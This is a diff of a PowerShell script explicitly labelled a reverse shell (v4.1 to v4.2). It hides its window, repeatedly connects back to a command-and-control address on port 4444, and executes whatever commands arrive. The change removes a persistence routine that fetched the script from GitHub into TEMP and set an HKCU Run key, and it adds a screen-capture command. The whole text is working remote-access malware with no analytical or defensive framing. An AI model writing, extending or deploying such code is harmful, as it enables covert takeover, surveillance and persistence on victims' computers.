@@ -1,65 +1,55 @@
-# Pico reverse shell v4.1 - Fixed Loop & Logic
+# Pico reverse shell v4.2 - Added Screenshot & Touch Alias
 # C2: 172.16.176.40:4444
 
-# 1. Hide the PowerShell Window
 $m = Add-Type -Name Win32 -MemberDefinition @'
 [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 '@ -PassThru
 $m::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)
 
-# 2. Persistence Setup (HKCU Run Key)
-$gh = 'https://raw.githubusercontent.com/B15cu1t/shell.ps1/main/shell_v4.ps1'
-$tmp = "$env:TEMP\sysupd.ps1"
-$reg = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
-
-if (-not (Test-Path $tmp)) { 
-    try { Invoke-WebRequest $gh -OutFile $tmp -UseBasicParsing } catch {} 
-}
-if (-not (Get-ItemProperty $reg -Name "SysUpdate" -ErrorAction SilentlyContinue)) { 
-    Set-ItemProperty $reg -Name "SysUpdate" -Value "powershell.exe -WindowStyle Hidden -File $tmp" 
+# Add a 'touch' alias so you stop getting errors
+if (-not (Get-Command touch -ErrorAction SilentlyContinue)) {
+    New-Alias -Name touch -Value New-Item -Force
 }
 
-# 3. Main Reverse Shell Loop
 while($true) {
     try {
         $c = New-Object System.Net.Sockets.TCPClient('172.16.176.40', 4444)
-        $s = $c.GetStream()
-        $e = New-Object System.Text.UTF8Encoding
-        
-        # Initial Connection Message
-        $prompt = $e.GetBytes("Connected to $($env:COMPUTERNAME). Type 'kill' to remove persistence and exit.`nPS $PWD> ")
-        $s.Write($prompt, 0, $prompt.Length)
+        $s = $c.GetStream(); $e = New-Object System.Text.UTF8Encoding
+        $p = $e.GetBytes("Connected. Commands: 'screenshot', 'kill', or standard PS.`nPS $PWD> ")
+        $s.Write($p, 0, $p.Length)
 
         [byte[]]$b = New-Object byte[] 65535
         while(($i = $s.Read($b, 0, $b.Length)) -ne 0) {
             $d = $e.GetString($b, 0, $i).Trim()
-            
-            # --- Kill Logic (Now inside the loop) ---
-            if($d -eq 'kill') {
-                $msg = $e.GetBytes("Cleaning up and exiting...`n")
-                $s.Write($msg, 0, $msg.Length)
-                
-                # Remove Registry Persistence
-                Remove-ItemProperty -Path $reg -Name "SysUpdate" -Force -ErrorAction SilentlyContinue
-                # Note: Cannot delete $tmp while script is running, but we stop the process
+            $out = ""
+
+            if ($d -eq 'kill') {
                 Stop-Process -Id $PID -Force
+            } 
+            # --- CUSTOM SCREENSHOT HANDLER ---
+            elseif ($d -eq 'screenshot') {
+                try {
+                    Add-Type -AssemblyName System.Windows.Forms, System.Drawing
+                    $Screen = [System.Windows.Forms.Screen]::PrimaryScreen
+                    $Top    = $Screen.Bounds.Top
+                    $Left   = $Screen.Bounds.Left
+                    $Width  = $Screen.Bounds.Width
+                    $Height = $Screen.Bounds.Height
+                    $Bitmap = New-Object System.Drawing.Bitmap $Width, $Height
+                    $Graphic = [System.Drawing.Graphics]::FromImage($Bitmap)
+                    $Graphic.CopyFromScreen($Left, $Top, 0, 0, $Bitmap.Size)
+                    $Path = "$env:TEMP\sc.png"
+                    $Bitmap.Save($Path, [System.Drawing.Imaging.ImageFormat]::Png)
+                    $Graphic.Dispose(); $Bitmap.Dispose()
+                    $out = "Screenshot saved to: $Path`n"
+                } catch { $out = "Screenshot failed: $($_.Exception.Message)`n" }
+            }
+            else {
+                $out = try { if ($d) { iex $d 2>&1 | Out-String } } catch { $_.Exception.Message }
             }
 
-            # --- Command Execution ---
-            # Using try/catch inside iex to prevent the whole shell from crashing on bad syntax
-            $out = try { 
-                if ($d) { iex $d 2>&1 | Out-String } else { "" } 
-            } catch { $_.Exception.Message }
-
-            # Send Output + New Prompt
-            $response = $e.GetBytes($out + "`nPS $PWD> ")
-            $s.Write($response, 0, $response.Length)
-            $s.Flush()
+            $resp = $e.GetBytes($out + "PS $PWD> ")
+            $s.Write($resp, 0, $resp.Length); $s.Flush()
         }
-        $c.Close()
-    }
-    catch { 
-        # Wait 5 seconds before retrying if C2 is down
-        Start-Sleep 5 
-    }
+    } catch { Start-Sleep 5 }
 }
